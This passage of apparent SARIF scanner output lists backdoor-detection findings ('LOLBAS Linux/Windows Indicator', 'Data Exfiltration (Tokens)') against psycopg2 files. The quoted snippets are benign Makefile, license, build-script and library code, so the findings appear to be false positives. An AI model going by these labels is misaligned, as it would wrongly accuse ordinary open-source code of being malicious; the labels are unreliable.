                      "text": "\trm -rf html src/sqlstate_errors.rst\n\nenv: requirements.txt\n\t$(PYTHON) -m venv env\n\t./env/bin/pip install -r requirements.txt\n\techo \"$$(pwd)/../build/lib.$(PYTHON_VERSION)\" \\\n\t\t> env/lib/python$(PYTHON_VERSION)/site-packages/psycopg.pth\n",
                      "markdown": "`\trm -rf html src/sqlstate_errors.rst\n\nenv: requirements.txt\n\t$(PYTHON) -m venv env\n\t./env/bin/pip install -r requirements.txt\n\techo \"$$(pwd)/../build/lib.$(PYTHON_VERSION)\" \\\n\t\t> env/lib/python$(PYTHON_VERSION)/site-packages/psycopg.pth\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/Makefile"
                },
                "region": {
                  "startLine": 19,
                  "endLine": 19,
                  "endColumn": 4,
                  "snippet": {
                    "text": "\nhtml: package src/sqlstate_errors.rst\n\t$(MAKE) $(SPHOPTS) -C src $@\n\tcp -r src/_build/html .\n\nsrc/sqlstate_errors.rst: ../psycopg/sqlstate_errors.h $(BUILD_DIR)\n\t./env/bin/python src/tools/make_sqlstate_docs.py $< > $@\n",
                    "rendered": {
                      "text": "\nhtml: package src/sqlstate_errors.rst\n\t$(MAKE) $(SPHOPTS) -C src $@\n\tcp -r src/_build/html .\n\nsrc/sqlstate_errors.rst: ../psycopg/sqlstate_errors.h $(BUILD_DIR)\n\t./env/bin/python src/tools/make_sqlstate_docs.py $< > $@\n",
                      "markdown": "`\nhtml: package src/sqlstate_errors.rst\n\t$(MAKE) $(SPHOPTS) -C src $@\n\tcp -r src/_build/html .\n\nsrc/sqlstate_errors.rst: ../psycopg/sqlstate_errors.h $(BUILD_DIR)\n\t./env/bin/python src/tools/make_sqlstate_docs.py $< > $@\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/doc/Makefile"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 7,
                  "endLine": 1,
                  "endColumn": 12,
                  "snippet": {
                    "text": ".PHONY: env help clean html package doctest\n\ndocs: html\n\n",
                    "rendered": {
                      "text": ".PHONY: env help clean html package doctest\n\ndocs: html\n\n",
                      "markdown": "`.PHONY: env help clean html package doctest\n\ndocs: html\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.gitignore"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 6,
                  "endLine": 11,
                  "snippet": {
                    "text": "*.sw[po]\n*.egg-info/\ndist/*\n/build\nenv\nenv?\n.idea\n.tox\n.vscode/\n",
                    "rendered": {
                      "text": "*.sw[po]\n*.egg-info/\ndist/*\n/build\nenv\nenv?\n.idea\n.tox\n.vscode/\n",
                      "markdown": "`*.sw[po]\n*.egg-info/\ndist/*\n/build\nenv\nenv?\n.idea\n.tox\n.vscode/\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extensions.py"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 22,
                  "endLine": 25,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extensions.py"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 42,
                  "endLine": 24,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extensions.py"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 50,
                  "endLine": 56,
                  "endColumn": 58,
                  "snippet": {
                    "text": "    string_types, binary_types, new_type, new_array_type, register_type,\n    ISQLQuote, Notify, Diagnostics, Column, ConnectionInfo,\n    QueryCanceledError, TransactionRollbackError,\n    set_wait_callback, get_wait_callback, encrypt_password, )\n\n\n\"\"\"Isolation level values.\"\"\"\n",
                    "rendered": {
                      "text": "    string_types, binary_types, new_type, new_array_type, register_type,\n    ISQLQuote, Notify, Diagnostics, Column, ConnectionInfo,\n    QueryCanceledError, TransactionRollbackError,\n    set_wait_callback, get_wait_callback, encrypt_password, )\n\n\n\"\"\"Isolation level values.\"\"\"\n",
                      "markdown": "`    string_types, binary_types, new_type, new_array_type, register_type,\n    ISQLQuote, Notify, Diagnostics, Column, ConnectionInfo,\n    QueryCanceledError, TransactionRollbackError,\n    set_wait_callback, get_wait_callback, encrypt_password, )\n\n\n\"\"\"Isolation level values.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 1207,
                  "startColumn": 55,
                  "endLine": 1207,
                  "endColumn": 59,
                  "snippet": {
                    "text": "        *cur*\\.\\ `~cursor.executemany`\\ (\\ *sql*\\ , *argslist*\\ )\n\n    but has a different implementation: Psycopg will join the statements into\n    fewer multi-statement commands, each one containing at most *page_size*\n    statements, resulting in a reduced number of server roundtrips.\n\n    After the execution of the function the `cursor.rowcount` property will\n",
                    "rendered": {
                      "text": "        *cur*\\.\\ `~cursor.executemany`\\ (\\ *sql*\\ , *argslist*\\ )\n\n    but has a different implementation: Psycopg will join the statements into\n    fewer multi-statement commands, each one containing at most *page_size*\n    statements, resulting in a reduced number of server roundtrips.\n\n    After the execution of the function the `cursor.rowcount` property will\n",
                      "markdown": "`        *cur*\\.\\ `~cursor.executemany`\\ (\\ *sql*\\ , *argslist*\\ )\n\n    but has a different implementation: Psycopg will join the statements into\n    fewer multi-statement commands, each one containing at most *page_size*\n    statements, resulting in a reduced number of server roundtrips.\n\n    After the execution of the function the `cursor.rowcount` property will\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 1178,
                  "startColumn": 18,
                  "endLine": 1178,
                  "endColumn": 22,
                  "snippet": {
                    "text": "def _paginate(seq, page_size):\n    \"\"\"Consume an iterable and return it in chunks.\n\n    Every chunk is at most `page_size`. Never return an empty chunk.\n    \"\"\"\n    page = []\n    it = iter(seq)\n",
                    "rendered": {
                      "text": "def _paginate(seq, page_size):\n    \"\"\"Consume an iterable and return it in chunks.\n\n    Every chunk is at most `page_size`. Never return an empty chunk.\n    \"\"\"\n    page = []\n    it = iter(seq)\n",
                      "markdown": "`def _paginate(seq, page_size):\n    \"\"\"Consume an iterable and return it in chunks.\n\n    Every chunk is at most `page_size`. Never return an empty chunk.\n    \"\"\"\n    page = []\n    it = iter(seq)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 989,
                  "startColumn": 25,
                  "endLine": 989,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                    "rendered": {
                      "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                      "markdown": "`\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 868,
                  "startColumn": 47,
                  "endLine": 868,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        for m in self._re_hstore.finditer(s):\n            if m is None or m.start() != start:\n                raise psycopg2.InterfaceError(\n                    f\"error parsing hstore pair at char {start}\")\n            k = _bsdec.sub(r'\\1', m.group(1))\n            v = m.group(2)\n            if v is not None:\n",
                    "rendered": {
                      "text": "        for m in self._re_hstore.finditer(s):\n            if m is None or m.start() != start:\n                raise psycopg2.InterfaceError(\n                    f\"error parsing hstore pair at char {start}\")\n            k = _bsdec.sub(r'\\1', m.group(1))\n            v = m.group(2)\n            if v is not None:\n",
                      "markdown": "`        for m in self._re_hstore.finditer(s):\n            if m is None or m.start() != start:\n                raise psycopg2.InterfaceError(\n                    f\"error parsing hstore pair at char {start}\")\n            k = _bsdec.sub(r'\\1', m.group(1))\n            v = m.group(2)\n            if v is not None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 1152,
                  "startColumn": 55,
                  "endLine": 1152,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\n    :param name: the name of a PostgreSQL composite type, e.g. created using\n        the |CREATE TYPE|_ command\n    :param conn_or_curs: a connection or cursor used to find the type oid and\n        components; the typecaster is registered in a scope limited to this\n        object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                    "rendered": {
                      "text": "\n    :param name: the name of a PostgreSQL composite type, e.g. created using\n        the |CREATE TYPE|_ command\n    :param conn_or_curs: a connection or cursor used to find the type oid and\n        components; the typecaster is registered in a scope limited to this\n        object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n",
                      "markdown": "`\n    :param name: the name of a PostgreSQL composite type, e.g. created using\n        the |CREATE TYPE|_ command\n    :param conn_or_curs: a connection or cursor used to find the type oid and\n        components; the typecaster is registered in a scope limited to this\n        object, unless *globally* is set to `!True`\n    :param globally: if `!False` (default) register the typecaster only on\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 1082,
                  "startColumn": 46,
                  "endLine": 1082,
                  "endColumn": 50,
                  "snippet": {
                    "text": "            tname = name\n            schema = 'public'\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        # get the type oid and attributes\n",
                    "rendered": {
                      "text": "            tname = name\n            schema = 'public'\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        # get the type oid and attributes\n",
                      "markdown": "`            tname = name\n            schema = 'public'\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        # get the type oid and attributes\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 989,
                  "startColumn": 41,
                  "endLine": 989,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                    "rendered": {
                      "text": "\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n",
                      "markdown": "`\n    The class is usually created by the `register_composite()` function.\n    You may want to create and register manually instances of the class if\n    querying the database at registration time is not desirable (such as when\n    using an :ref:`asynchronous connections <async-support>`).\n\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 952,
                  "startColumn": 33,
                  "endLine": 952,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    from the database have keys/values according to the *unicode* parameter.\n\n    The |hstore| contrib module must be already installed in the database\n    (executing the ``hstore.sql`` script in your ``contrib`` directory).\n    Raise `~psycopg2.ProgrammingError` if the type is not found.\n    \"\"\"\n    if oid is None:\n",
                    "rendered": {
                      "text": "    from the database have keys/values according to the *unicode* parameter.\n\n    The |hstore| contrib module must be already installed in the database\n    (executing the ``hstore.sql`` script in your ``contrib`` directory).\n    Raise `~psycopg2.ProgrammingError` if the type is not found.\n    \"\"\"\n    if oid is None:\n",
                      "markdown": "`    from the database have keys/values according to the *unicode* parameter.\n\n    The |hstore| contrib module must be already installed in the database\n    (executing the ``hstore.sql`` script in your ``contrib`` directory).\n    Raise `~psycopg2.ProgrammingError` if the type is not found.\n    \"\"\"\n    if oid is None:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 901,
                  "startColumn": 46,
                  "endLine": 901,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        # Store the transaction status of the connection to revert it after use\n        conn_status = conn.status\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        rv0, rv1 = [], []\n",
                    "rendered": {
                      "text": "        # Store the transaction status of the connection to revert it after use\n        conn_status = conn.status\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        rv0, rv1 = [], []\n",
                      "markdown": "`        # Store the transaction status of the connection to revert it after use\n        conn_status = conn.status\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        rv0, rv1 = [], []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 801,
                  "startColumn": 41,
                  "endLine": 801,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            self.getquoted = self._getquoted_8\n\n    def _getquoted_8(self):\n        \"\"\"Use the operators available in PG pre-9.0.\"\"\"\n        if not self.wrapped:\n            return b\"''::hstore\"\n\n",
                    "rendered": {
                      "text": "            self.getquoted = self._getquoted_8\n\n    def _getquoted_8(self):\n        \"\"\"Use the operators available in PG pre-9.0.\"\"\"\n        if not self.wrapped:\n            return b\"''::hstore\"\n\n",
                      "markdown": "`            self.getquoted = self._getquoted_8\n\n    def _getquoted_8(self):\n        \"\"\"Use the operators available in PG pre-9.0.\"\"\"\n        if not self.wrapped:\n            return b\"''::hstore\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6,
                  "endLine": 30,
                  "endColumn": 12,
                  "snippet": {
                    "text": "# License for more details.\n\nimport os as _os\nimport time as _time\nimport re as _re\nfrom collections import namedtuple, OrderedDict\n\n",
                    "rendered": {
                      "text": "# License for more details.\n\nimport os as _os\nimport time as _time\nimport re as _re\nfrom collections import namedtuple, OrderedDict\n\n",
                      "markdown": "`# License for more details.\n\nimport os as _os\nimport time as _time\nimport re as _re\nfrom collections import namedtuple, OrderedDict\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 22,
                  "endLine": 18,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/extras.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 42,
                  "endLine": 17,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/pool.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 22,
                  "endLine": 17,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/pool.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 42,
                  "endLine": 16,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/lib/pool.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 29,
                  "endLine": 101,
                  "endColumn": 34,
                  "snippet": {
                    "text": "            raise PoolError(\"connection pool is closed\")\n\n        if key is None:\n            key = self._rused.get(id(conn))\n            if key is None:\n                raise PoolError(\"trying to put unkeyed connection\")\n\n",
                    "rendered": {
                      "text": "            raise PoolError(\"connection pool is closed\")\n\n        if key is None:\n            key = self._rused.get(id(conn))\n            if key is None:\n                raise PoolError(\"trying to put unkeyed connection\")\n\n",
                      "markdown": "`            raise PoolError(\"connection pool is closed\")\n\n        if key is None:\n            key = self._rused.get(id(conn))\n            if key is None:\n                raise PoolError(\"trying to put unkeyed connection\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 26,
                  "endLine": 104,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# install this thing.\nexport PIP_FORCE_REINSTALL=1\n\n# Replace the package name\nsed -i .bak 's/^setup(name=\"psycopg2\"/setup(name=\"psycopg2-binary\"/' setup.py\n\ncibuildwheel\n",
                    "rendered": {
                      "text": "# install this thing.\nexport PIP_FORCE_REINSTALL=1\n\n# Replace the package name\nsed -i .bak 's/^setup(name=\"psycopg2\"/setup(name=\"psycopg2-binary\"/' setup.py\n\ncibuildwheel\n",
                      "markdown": "`# install this thing.\nexport PIP_FORCE_REINSTALL=1\n\n# Replace the package name\nsed -i .bak 's/^setup(name=\"psycopg2\"/setup(name=\"psycopg2-binary\"/' setup.py\n\ncibuildwheel\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
